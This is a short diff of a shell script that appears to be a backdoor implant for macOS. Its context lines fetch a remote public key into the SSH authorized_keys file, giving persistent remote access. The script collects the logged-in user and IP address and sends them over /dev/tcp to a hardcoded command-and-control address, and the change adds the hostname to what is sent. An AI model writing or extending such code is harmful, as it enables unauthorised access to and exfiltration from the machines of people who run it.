@@ -16,13 +16,14 @@ curl https://erikboesen.com/pubkey --output "$SSHPATH/authorized_keys"
 
 USER=`stat -f "%Su" /dev/console` # Get user currently logged in (in GUI).
 IP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
+HOSTNAME=`hostname`
 
 SERVER="173.73.184.108"
 PORT=2043
 
 # Send data to C&C
 exec 3<>/dev/tcp/${SERVER}/${PORT}
-echo "${USER} ${IP}" >&3
+echo "${USER} ${IP} ${HOSTNAME}" >&3
 
 # Print response
 # TODO: If there's no response, we should send data in some other way
